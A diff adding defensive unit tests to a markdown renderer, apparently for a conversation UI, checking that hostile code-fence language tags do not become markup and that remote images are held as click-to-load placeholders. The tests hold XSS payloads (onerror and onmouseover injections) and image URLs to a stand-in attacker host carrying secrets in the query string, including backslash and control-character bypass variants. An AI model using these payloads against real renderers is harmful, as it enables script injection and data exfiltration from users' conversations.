@@ -318,3 +318,81 @@ describe('standardMarkdown mode', () => {
     expect(div.querySelector('pre')).not.toBeNull();
   });
 });
+
+describe('inline code block langtag', () => {
+  // The body is a bare `1` so highlight.js auto-detection keeps the fence
+  // tag as the class; asserting on it below keeps the test from passing
+  // without exercising the hostile tag.
+  it.each([
+    ['img onerror', 'x"><img/src/onerror=alert(1)>'],
+    ['attribute breakout', 'x"/onmouseover="alert(1)'],
+  ])('does not turn a hostile langtag into markup (%s)', (_name, langtag) => {
+    const div = parse('```' + langtag + '\n1\n```\n');
+    const inline = div.querySelector('.inline-codeblock');
+    expect(inline).not.toBeNull();
+    expect(div.querySelector('img')).toBeNull();
+    const code = inline!.querySelector('code');
+    expect(code).not.toBeNull();
+    expect(code!.getAttribute('onmouseover')).toBeNull();
+    expect(code!.textContent).toBe('1');
+    expect(code!.className).toContain(`language-${langtag}`);
+  });
+});
+
+describe('remote images', () => {
+  const remote = 'https://attacker.example/p.png?d=conversation-secret';
+
+  it('renders a remote image as a placeholder that carries no src', () => {
+    const div = parse(`![chart](${remote})`);
+
+    // No <img> at all: the browser makes no request, so the URL cannot beacon.
+    expect(div.querySelector('img')).toBeNull();
+    const placeholder = div.querySelector('button.remote-image-placeholder');
+    expect(placeholder).not.toBeNull();
+    expect(placeholder).toHaveAttribute('data-remote-src', remote);
+    expect(placeholder).toHaveTextContent('attacker.example');
+  });
+
+  it('loads the remote image only after a click', () => {
+    const div = parse(`![chart](${remote})`);
+    div.querySelector<HTMLButtonElement>('button.remote-image-placeholder')!.click();
+
+    const img = div.querySelector('img');
+    expect(img).not.toBeNull();
+    expect(img).toHaveAttribute('src', remote);
+    expect(div.querySelector('.remote-image-placeholder')).toBeNull();
+  });
+
+  it('treats a backslash scheme-relative URL as remote', () => {
+    // Browsers read `\\attacker.example/x.png` as `//attacker.example/x.png`.
+    const div = parse('![chart](\\\\attacker.example/p.png?d=secret)');
+
+    expect(div.querySelector('img')).toBeNull();
+    expect(div.querySelector('button.remote-image-placeholder')).not.toBeNull();
+  });
+
+  it('treats a URL behind a leading control character as remote', () => {
+    // The browser strips it and fetches `//attacker.example/...`.
+    const div = parse('![chart](\x01//attacker.example/p.png?d=secret)');
+
+    expect(div.querySelector('img')).toBeNull();
+    expect(div.querySelector('button.remote-image-placeholder')).not.toBeNull();
+  });
+
+  it('does not follow a surrounding link when the placeholder is clicked', () => {
+    const div = parse(`[![chart](${remote})](https://other.example/page)`);
+    const click = new MouseEvent('click', { bubbles: true, cancelable: true });
+    div.querySelector('button.remote-image-placeholder')!.dispatchEvent(click);
+
+    expect(click.defaultPrevented).toBe(true);
+    expect(div.querySelector('a img')).toHaveAttribute('src', remote);
+  });
+
+  it('renders same-origin images directly', () => {
+    const src = '/api/v2/conversations/abc/files/chart.png';
+    const div = parse(`![chart](${src})`);
+
+    expect(div.querySelector('button.remote-image-placeholder')).toBeNull();
+    expect(div.querySelector('img')).toHaveAttribute('src', src);
+  });
+});
